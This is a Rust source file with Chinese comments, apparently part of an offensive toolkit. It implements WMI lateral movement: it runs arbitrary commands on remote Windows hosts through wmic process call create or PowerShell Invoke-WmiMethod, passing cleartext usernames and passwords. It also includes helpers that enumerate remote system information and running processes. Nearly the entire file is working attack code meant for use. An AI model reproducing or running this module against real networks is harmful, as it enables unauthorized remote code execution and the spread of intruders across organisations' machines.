//! WMI 横向移动模块
//!
//! 远程创建进程。WMI使用DCOM/RPC通信，不需要SMB共享。

use crate::lateral::LateralConfig;

/// 执行WMI横向移动
pub async fn execute_wmi(config: &LateralConfig) -> Result<(String, String, i32), String> {
    let target = &config.target;

    tracing::info!("[WMI] {}\\{} -> {}", whoami::hostname(), whoami::username(), target);

    // 使用wmic命令进行WMI远程执行
    let full_command = format!("{} {}", config.command, config.args.join(" "));

    // 1. 尝试使用wmic（需要管理员权限）
    let wmic_result = execute_via_wmic(target, &full_command, config);
    if wmic_result.is_ok() {
        return wmic_result;
    }

    // 2. 备用：使用PowerShell WMI
    execute_via_powershell_wmi(target, &full_command, config)
}

/// 通过wmic执行
fn execute_via_wmic(
    target: &str,
    command: &str,
    config: &LateralConfig,
) -> Result<(String, String, i32), String> {
    let mut cmd = std::process::Command::new("wmic");

    // 添加认证参数
    match &config.credential {
        crate::lateral::LateralCredential::Cleartext { username, password, .. } => {
            cmd.args(["/user:", username]);
            cmd.args(["/password:", password]);
        }
        _ => {}
    }

    cmd.args([
        "/node:", target,
        "process", "call", "create",
        &format!("\"{}\"", command),
    ]);

    let output = cmd.output()
        .map_err(|e| format!("wmic执行失败: {}", e))?;

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();

    if output.status.success() && stdout.contains("ReturnValue = 0") {
        Ok((stdout, stderr, 0))
    } else {
        Err(format!("wmic失败: {} {}", stdout, stderr))
    }
}

/// 通过PowerShell WMI执行
fn execute_via_powershell_wmi(
    target: &str,
    command: &str,
    config: &LateralConfig,
) -> Result<(String, String, i32), String> {
    // 构造认证凭据块（如果有）
    let cred_block = match &config.credential {
        crate::lateral::LateralCredential::Cleartext { username, password, domain } => {
            let domain_part = domain.as_deref().unwrap_or(".");
            format!(
                "$secpass = ConvertTo-SecureString '{}' -AsPlainText -Force;\
                 $cred = New-Object System.Management.Automation.PSCredential('{}\\{}', $secpass);",
                password, domain_part, username
            )
        }
        _ => String::new(),
    };

    let ps_script = format!(
        r#"{}
$process = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '{}' -ComputerName '{}'{};
if ($process.ReturnValue -eq 0) {{ Write-Output "SUCCESS" }} else {{ Write-Output "FAILED: $($process.ReturnValue)" }}
"#,
        cred_block,
        command.replace("'", "''"),
        target,
        if cred_block.is_empty() { "" } else { " -Credential $cred" },
    );

    let output = std::process::Command::new("powershell.exe")
        .args(["-NoProfile", "-NonInteractive", "-Command", &ps_script])
        .output()
        .map_err(|e| format!("PowerShell WMI失败: {}", e))?;

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();

    if output.status.success() && stdout.contains("SUCCESS") {
        Ok((stdout, stderr, 0))
    } else {
        Err(format!("PowerShell WMI失败: {} {}", stdout, stderr))
    }
}

/// WMI查询（非命令执行，用于信息收集）
pub fn wmi_query(target: &str, query: &str) -> Result<String, String> {
    let output = std::process::Command::new("wmic")
        .args(["/node:", target, query])
        .output()
        .map_err(|e| format!("WMI查询失败: {}", e))?;

    if output.status.success() {
        Ok(String::from_utf8_lossy(&output.stdout).to_string())
    } else {
        Err(String::from_utf8_lossy(&output.stderr).to_string())
    }
}

/// 使用WMI获取远程主机信息
pub fn get_remote_system_info(target: &str) -> Result<String, String> {
    wmi_query(target, "os get Caption,Version,TotalVisibleMemorySize,FreePhysicalMemory /format:list")
}

/// 使用WMI列出远程进程
pub fn list_remote_processes(target: &str) -> Result<String, String> {
    wmi_query(target, "process get Name,ProcessId,WorkingSetSize /format:csv")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_wmi_query_localhost() {
        // 查询本地主机（不需要横向移动权限）
        let result = wmi_query("localhost", "os get Caption /format:list");
        // 在Windows上应该成功
        if cfg!(windows) {
            assert!(result.is_ok());
        }
    }
}
